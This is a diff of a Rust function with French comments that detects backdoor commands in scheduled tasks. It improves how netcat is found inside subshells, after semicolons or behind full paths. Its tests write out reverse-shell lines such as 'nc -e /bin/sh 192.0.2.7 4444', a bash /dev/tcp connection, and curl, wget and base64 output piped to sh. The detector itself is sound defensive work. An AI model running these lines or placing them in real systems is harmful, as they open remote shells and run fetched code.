@@ -89,7 +89,18 @@ pub(super) const DOSSIERS_CACHES_NORMAUX: [&str; 10] = [
 /// apparaît sans rien lancer. Seules des formes précises sont retenues, pour ne pas alerter sur chaque script maison.
 pub(super) fn commande_suspecte(commande: &str, lancement: bool) -> Option<&'static str> {
     let mots: Vec<&str> = commande.split_whitespace().collect();
-    let a = |m: &str| mots.iter().any(|x| x.trim_matches(|c| c == '"' || c == '\'') == m);
+    // Les mots coupés aussi sur ce qui sépare ou groupe les commandes du shell, comme pour la chasse :
+    // « (nc -e /bin/sh … &) » ou « x;nc -e … » cachaient nc dans « (nc » ou « x;nc ». Un programme se compare par
+    // son nom de fichier (« /bin/nc »), une option telle quelle.
+    let mots_du_shell: Vec<&str> = crate::machine::chasse::mots(commande)
+        .into_iter()
+        .map(|(m, _)| m)
+        .collect();
+    let a = |m: &str| {
+        mots_du_shell
+            .iter()
+            .any(|x| x.trim_matches(|c| c == '"' || c == '\'') == m || crate::machine::chasse::nom_de_fichier(x) == m)
+    };
     if commande.contains("/dev/tcp/") || commande.contains("/dev/udp/") {
         return Some(tr!(
             "connexion réseau ouverte par le shell (shell inversé)",
@@ -714,6 +725,16 @@ mod tests {
         // Formes de porte dérobée reconnues partout.
         assert!(commande_suspecte("bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'", false).is_some());
         assert!(commande_suspecte("nc -e /bin/sh 1.2.3.4 4444", false).is_some());
+        // nc caché dans une sous-commande, après un « ; » ou derrière un chemin.
+        for ligne in [
+            "@reboot (nc -e /bin/sh 192.0.2.7 4444 &)",
+            "* * * * * cd /tmp;nc -e /bin/sh 192.0.2.7 4444",
+            "* * * * * true&&ncat -c bash 192.0.2.7 4444",
+            "@reboot { /usr/bin/nc -e /bin/sh 192.0.2.7 4444; }",
+            "sh -c '`netcat -e /bin/sh 192.0.2.7 4444`'",
+        ] {
+            assert!(commande_suspecte(ligne, false).is_some(), "{ligne}");
+        }
         assert!(commande_suspecte("curl -fsSL https://x.example/a | sh", false).is_some());
         assert!(commande_suspecte("wget -qO- http://x | /bin/bash", false).is_some());
         assert!(commande_suspecte("echo aGk= | base64 -d | sh", false).is_some());
@@ -738,6 +759,7 @@ mod tests {
         // Pas des portes dérobées : curl sans exécution, nc sans shell, grep après curl.
         assert!(commande_suspecte("curl -fsS https://x/a.json | jq .", false).is_none());
         assert!(commande_suspecte("nc -z 10.0.0.1 22", false).is_none());
+        assert!(commande_suspecte("(nc -z 10.0.0.1 22 && echo ok)", false).is_none());
         assert!(commande_suspecte("export TMPDIR=/tmp/moi", false).is_none());
         // Programme lancé depuis /tmp ou un dossier caché : seulement pour une commande lancée.
         assert!(commande_suspecte("/tmp/.x/run --daemon", true).is_some());
